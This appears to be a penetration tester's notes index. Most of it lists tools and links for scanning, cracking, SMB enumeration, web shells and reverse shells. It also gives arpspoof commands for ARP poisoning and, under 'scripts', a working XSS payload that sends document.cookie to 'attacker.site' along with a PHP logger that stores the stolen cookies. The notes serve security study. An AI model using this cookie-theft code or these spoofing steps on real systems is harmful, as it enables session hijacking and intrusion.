# Tools
## connectivity / port scanning
- [[icmp]]
- [[nmap]]
- [[ssl]]
- `sublist3r` **still needs some work**
- `amass` **still needs some work**
-   [PacketWhisper](https://github.com/TryCatchHCF/PacketWhisper)
-   [egress-checking](https://labs.mwrinfosecurity.com/blog/egress-checking)
-   [dnsdumpster.com](http://dnsdumpster.com)

## Web Apps
- `httprint -P0 -h -s` **needs some work**
- [[http_dirs]]

### SQL injection
- [[sql]]
- [mysql cli](https://dev.mysql.com/doc/refman/8.0/en/mysql.html)

### Web shells
- [[web_shells]]

## Bruteforcing and cracking
-   [[john]]
- [[password_lists]]
- [[hask_cat]]
- [hash-id](https://pypi.org/project/hashID)
- https://www.tunnelsup.com/hash-analyzer/
-   `ophcrack`
- [[hydra]]
-   [one-rule-to-rule-them-all/](https://notsosecure.com/one-rule-to-rule-them-all/)
-   [commom passwords](https://wiki.skullsecurity.org/Passwords)

## SMB enumeration
-   relevant ports: 135,139,445
-   [[win_smb_enum]]
- [[linux_smb_enum]]

## ARP poisoning
-   configure routing `echo 1 > /rpoc/sys/net/ipv4/ip_forward`OR `sudo sysctl -w net.ipv4.ip_forward=1`
-   `arpspoof -i <interface> -t <target victim> -r <host victim>` 
-   use wireshark to watch the traffic pass through

## MetaSploit
-   [metasploit](https://www.metasploit.com)
- [[metasploit]]
## shells
- [[netcat]]
- [[socat]]
- [[bash_shells]]
- [[powershell_shells]]
-   [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-   [payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#golang)
-   [shell upgrading to tty](https://netsec.ws/?p=337)
- `/usr/share/webshells` in kali
- fix row / column size
	- `stty -a` retrieve default settings for terminal
	- replace target settings with these numbers: `stty rows <number>` and `stty cols <number>`

## PrivEsc
- [[linux_privesc]]
- [[windows_privesc]]

### msfvenom
- [[msfvenom]]

# scripts
## XSS
### target
```
<script>
var i = new Image();
i.src = "http://attacker.site/log.php?q="+document.cookie;
</script>
```
### attacker
```
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```
run with: `php -S 0.0.0.0:8090`
# configs for SMB
```
client min protocol = CORE
client max protocol = SMB3 
client use spnego = no 
client ntlmv2 auth = no
```
